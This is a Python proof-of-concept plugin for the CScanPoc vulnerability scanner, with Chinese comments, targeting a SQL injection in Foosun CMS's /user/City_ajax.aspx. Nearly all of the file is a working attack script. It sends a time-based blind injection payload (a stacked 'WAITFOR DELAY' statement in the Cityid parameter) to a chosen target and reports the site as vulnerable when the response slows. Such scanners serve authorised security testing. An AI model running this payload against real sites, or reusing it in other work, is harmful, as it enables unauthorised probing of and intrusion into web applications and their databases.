# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'Foosun_0002'  # 平台漏洞编号，留空
    name = '风讯CMS /user/City_ajax.aspx sql注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-11-04'  # 漏洞公布时间
    desc = '''
    风讯网站管理系统包括了信息采集、整理、分类、审核、发布和管理的全过程，具备完善的信息管理和发布管理功能，是企事业单位网站、内部网站和各类ICP网站内容管理和维护的理想工具。
    风讯CMS /user/City_ajax.aspx sql注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0150742'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '风讯CMS'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '0eb470ab-85d1-414d-b63c-ec9937b89d25'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer     :  http://www.wooyun.org/bugs/wooyun-2010-0150742
            hh = hackhttp.hackhttp()
            arg = self.target
            url = arg + "/user/City_ajax.aspx?Cityid=1"
            payload = "%27;WAITFOR%20DELAY%20%270:0:5%27--"
            url2 = url + payload
            time0 = time.time()
            code1, head, res, errcode, _ = hh.http(url)
            time1 = time.time()
            code2, head, res, errcode, _ = hh.http(url2)
            time2 = time.time()

            if code1 == 200 and code2 == 200 and ((time2 - time1) - (time1 - time0)) >= 4:
                #security_hole(url + '   found sql injection!')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
